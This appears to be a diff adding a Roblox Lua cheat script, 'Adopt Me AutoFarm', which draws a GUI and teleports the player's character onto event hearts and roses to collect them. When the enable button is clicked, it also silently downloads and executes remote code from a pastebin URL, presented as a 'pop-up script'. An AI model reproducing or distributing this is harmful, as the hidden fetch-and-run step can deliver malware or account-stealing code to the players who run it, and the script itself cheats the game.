@@ -1,0 +1,158 @@
+local TweenService = game:GetService("TweenService")
+
+-- Parent GUI to CoreGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Parent = game.CoreGui
+
+-- Main Frame
+local MainFrame = Instance.new("Frame")
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+MainFrame.BackgroundTransparency = 0.3
+MainFrame.Size = UDim2.new(0, 340, 0, 175)
+MainFrame.Position = UDim2.new(0.5, -170, 0.5, -87)
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+local UICorner = Instance.new("UICorner")
+UICorner.Parent = MainFrame
+
+-- UIStroke (Animated Cyan Border)
+local UIStroke = Instance.new("UIStroke")
+UIStroke.Parent = MainFrame
+UIStroke.Thickness = 3
+UIStroke.Color = Color3.fromRGB(100, 255, 255)
+
+local function animateUIStroke()
+    while true do
+        local tween1 = TweenService:Create(UIStroke, TweenInfo.new(0.5), {Color = Color3.fromRGB(150, 255, 255)})
+        local tween2 = TweenService:Create(UIStroke, TweenInfo.new(0.5), {Color = Color3.fromRGB(0, 200, 255)})
+        tween1:Play()
+        tween1.Completed:Wait()
+        tween2:Play()
+        tween2.Completed:Wait()
+    end
+end
+task.spawn(animateUIStroke)
+
+-- Title Background
+local TitleBackground = Instance.new("Frame")
+TitleBackground.Parent = MainFrame
+TitleBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+TitleBackground.BackgroundTransparency = 0.3
+TitleBackground.Size = UDim2.new(0.9, 0, 0, 35)
+TitleBackground.Position = UDim2.new(0.05, 0, 0, 5)
+TitleBackground.BorderSizePixel = 0
+
+local TitleUICorner = Instance.new("UICorner")
+TitleUICorner.Parent = TitleBackground
+
+-- Title
+local Title = Instance.new("TextLabel")
+Title.Parent = TitleBackground
+Title.Text = "Adopt Me AutoFarm"
+Title.Size = UDim2.new(1, 0, 1, 0)
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 22
+Title.TextStrokeTransparency = 0
+Title.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+
+-- Grey Transparent Line Separator
+local TitleSeparator = Instance.new("Frame")
+TitleSeparator.Parent = MainFrame
+TitleSeparator.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+TitleSeparator.BackgroundTransparency = 0.5
+TitleSeparator.Size = UDim2.new(0.9, 0, 0, 2)
+TitleSeparator.Position = UDim2.new(0.05, 0, 0, 42)
+TitleSeparator.BorderSizePixel = 0
+
+-- Enable Button
+local EnableButton = Instance.new("TextButton")
+EnableButton.Parent = MainFrame
+EnableButton.Text = "Turn On Auto Farm"
+EnableButton.Size = UDim2.new(0.8, 0, 0, 40)
+EnableButton.Position = UDim2.new(0.1, 0, 0.35, 0)
+EnableButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+EnableButton.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+EnableButton.Font = Enum.Font.GothamBold
+EnableButton.TextSize = 18
+EnableButton.TextStrokeTransparency = 0
+EnableButton.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.Parent = EnableButton
+ButtonCorner.CornerRadius = UDim.new(0, 8)
+
+-- Guide Text
+local GuideText = Instance.new("TextLabel")
+GuideText.Parent = MainFrame
+GuideText.Text = "💡 Go To The Event Area\nAnd Click 'Turn On AutoFarm'\nTo Start!"
+GuideText.Size = UDim2.new(0.95, 0, 0, 50)
+GuideText.Position = UDim2.new(0.025, 0, 0.62, 0)
+GuideText.TextColor3 = Color3.fromRGB(255, 215, 0)
+GuideText.BackgroundTransparency = 1
+GuideText.Font = Enum.Font.GothamBold
+GuideText.TextSize = 14
+GuideText.TextStrokeTransparency = 0
+GuideText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+
+-- Info Text
+local InfoText = Instance.new("TextLabel")
+InfoText.Parent = MainFrame
+InfoText.Text = "v1.09.21 | Created By Blox Zilla"
+InfoText.Size = UDim2.new(1, 0, 0, 20)
+InfoText.Position = UDim2.new(0, 0, 0.88, 0)
+InfoText.TextColor3 = Color3.fromRGB(255, 50, 50)
+InfoText.BackgroundTransparency = 1
+InfoText.Font = Enum.Font.GothamBold
+InfoText.TextSize = 14
+InfoText.TextStrokeTransparency = 0
+InfoText.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+
+-- Auto Farm Function
+local autoFarmEnabled = false
+
+local function autoFarm()
+    while autoFarmEnabled do
+        task.wait(0.25)
+
+        for _, b in pairs(game:GetService("Workspace").StaticMap.Valentines2025.Hearts:GetChildren()) do
+            if b.Name == "CupidHeart" and b:FindFirstChild("Collider") then
+                game:GetService("Workspace").PlayerCharacters[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = CFrame.new(b.Collider.Position)
+            end
+        end
+
+        for _, b in pairs(game:GetService("Workspace").StaticMap.Valentines2025.Roses:GetChildren()) do
+            if b.Name == "Rose" and b:FindFirstChild("Collider") then
+                game:GetService("Workspace").PlayerCharacters[game.Players.LocalPlayer.Name].HumanoidRootPart.CFrame = CFrame.new(b.Collider.Position)
+            end
+        end
+    end
+end
+
+-- Button Click Function
+EnableButton.MouseButton1Click:Connect(function()
+    autoFarmEnabled = not autoFarmEnabled
+
+    if autoFarmEnabled then
+        EnableButton.Text = "Auto Farm Enabled"
+        EnableButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
+
+        -- **Load and execute pop-up script dynamically**
+        local success, response = pcall(function()
+            return loadstring(game:HttpGet("https://pastebin.com/raw/RTUz04ct"))()
+        end)
+
+        if not success then
+            warn("Failed to load pop-up script:", response)
+        end
+
+        task.spawn(autoFarm)
+    else
+        EnableButton.Text = "Turn On Auto Farm"
+        EnableButton.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+    end
+end)
